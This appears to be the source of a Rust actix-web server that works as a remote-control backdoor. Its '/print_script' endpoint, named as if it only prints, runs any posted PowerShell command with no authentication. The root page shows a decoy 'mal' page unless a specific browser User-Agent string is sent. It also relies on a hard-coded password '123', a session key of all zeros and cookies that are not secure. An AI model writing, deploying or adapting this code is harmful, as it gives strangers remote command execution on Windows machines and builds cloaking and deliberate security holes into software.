extern crate get_if_addrs;
use actix::{Actor, StreamHandler};
use actix_files as fs;
use actix_session::{CookieSession, Session};
use actix_web::{http, web, App, Error, HttpRequest, HttpResponse, HttpServer, Responder};
use actix_web_actors::ws;
use serde::Deserialize;
use serde_json::{json, Value};
use actix::ActorContext;
use get_if_addrs::get_if_addrs;
use std::net::IpAddr;
use zeroize::{Zeroize, ZeroizeOnDrop};
use bytestring::ByteString;

#[derive(Deserialize)]
struct Password {
    password: String,
}

#[derive(Deserialize)]
struct PowerShellScript {
    script: String,
}

struct MyWebSocket;

impl Actor for MyWebSocket {
    type Context = ws::WebsocketContext<Self>;

    fn started(&mut self, ctx: &mut Self::Context) {
        println!("WebSocket bağlantısı başladı.");
    }

    fn stopped(&mut self, ctx: &mut Self::Context) {
        println!("Connection closed.");
    }
}

/// Handler for ws::Message message
impl StreamHandler<Result<ws::Message, ws::ProtocolError>> for MyWebSocket {
    fn handle(
        &mut self,
        msg: Result<ws::Message, ws::ProtocolError>,
        ctx: &mut Self::Context,
    ) {
        match msg {
            Ok(ws::Message::Text(text)) => {
                let stringed = text.to_string();
                dene(stringed);
                ctx.text(text);
            },
            Ok(ws::Message::Close(reason)) => {
                ctx.close(reason);
                ctx.stop();
            }
            
            _ => (),
        }
    }
}

fn dene(text: String) {
    let json: Value = serde_json::from_str(&text).unwrap();
    let message = json["message"].as_str().unwrap();
    println!("Received unparsed: {}", text);
    println!("Received message: {}", message);
}

async fn print_powershell_script(script_data: web::Json<PowerShellScript>) -> impl Responder {
    println!("Received PowerShell script: {}", script_data.script);
    std::process::Command::new("powershell.exe")
        .arg("-Command")
        .arg(&script_data.script)
        .output()
        .expect("Failed to execute process");
    HttpResponse::Ok()
        .content_type("text/plain")
        .body("Script received and printed")
}

fn get_local_ip_address() -> String {
    get_if_addrs()
        .ok()
        .and_then(|addrs| {
            addrs
                .into_iter()
                .find(|if_addr| {
                    matches!(if_addr.addr.ip(), IpAddr::V4(_)) && !if_addr.addr.ip().is_loopback()
                })
                .map(|if_addr| if_addr.addr.ip().to_string())
        })
        .unwrap_or_else(|| "127.0.0.1".to_string())
}

async fn check_point(req: HttpRequest, session: Session) -> impl Responder {
    match req.headers().get("User-Agent") {
        Some(header_value) => {
            let user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36";
            if header_value.to_str().unwrap() == user_agent {
                session.insert("access", "granted").unwrap();
                session.renew();
                HttpResponse::Found().header("Location", "/").finish()
            } else {
                HttpResponse::Found().header("Location", "/error").finish()
            }
        }
        None => {
            println!("İstek bu header ile gelmedi.");
            HttpResponse::Found().header("Location", "/error").finish()
        }
    }
}


async fn check_pass(info: web::Json<Password>, session: Session) -> impl Responder {
    if info.password == "123" { // you can change that
        session.insert("user", "authenticated").unwrap();
        HttpResponse::Found()
            .header(http::header::LOCATION, "/machine")
            .finish()
    } else {
        HttpResponse::Unauthorized().finish()
    }
}

async fn machine(session: Session) -> impl Responder {
    if let Some(_) = session.get::<String>("user").unwrap() {
        let html_content = include_str!("../assets/machine.html");
        HttpResponse::Ok()
            .content_type("text/html")
            .body(html_content)
    } else {
        HttpResponse::Found()
            .header(http::header::LOCATION, "/")
            .finish()
    }
}

async fn ip_address(session: Session) -> impl Responder {
    let ip_address = get_local_ip_address();

    let content = if session.get::<String>("access").unwrap_or(None) == Some("granted".to_string()) {
        ip_address
    } else {
        "garip".to_string()
    };

    HttpResponse::Ok().body(content)
}
async fn index(session: Session) -> impl Responder {
    let html_content = include_str!("../assets/index.html");
    let fake_content = include_str!("../assets/mal/mal.html");
    let mut fake_vector = Vec::new();
    let mut vector = Vec::new();
    vector.push(html_content.replace("{{GUZELIMBUKAFATAS}}", "sanane gaaarrdddaass"));
    fake_vector.push(fake_content.replace("{{GUZELIMBUKAFATAS}}", "sanane gaaarrdddaass"));
    let content = if session.get::<String>("access").unwrap_or(None) == Some("granted".to_string())
    {
        vector.into_iter().collect::<String>()
    } else {
        fake_vector.into_iter().collect::<String>()
    };

    HttpResponse::Ok().content_type("text/html").body(content)
}
async fn websocket(req: HttpRequest, stream: web::Payload) -> Result<HttpResponse, Error> {
    let resp = ws::start(MyWebSocket {}, &req, stream);
    println!("{:?}", resp);
    resp
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    let local_ip = get_local_ip_address();
    let bind_address = format!("{}:1337", local_ip);
    println!("Server started at: http://{}", bind_address);

    HttpServer::new(|| {
        App::new()
            .wrap(
                CookieSession::signed(&[0; 32])
                    .expires_in(60)
                    .name("yatassayalatassa_haha_")
                    .secure(false),
            )
            .service(fs::Files::new("/static", "static").show_files_listing())
            .service(web::resource("/").route(web::get().to(index)))
            .service(web::resource("/check_pass").route(web::post().to(check_pass)))
            .service(web::resource("/machine").route(web::get().to(machine)))
            .service(web::resource("/print_script").route(web::post().to(print_powershell_script))) // Add this line
            .service(web::resource("/check_point").route(web::get().to(check_point)))
            .service(web::resource("/ip").route(web::get().to(ip_address)))
            .service(web::resource("/ws").route(web::get().to(websocket)))
    })
    .bind(&bind_address)?
    .run()
    .await
}
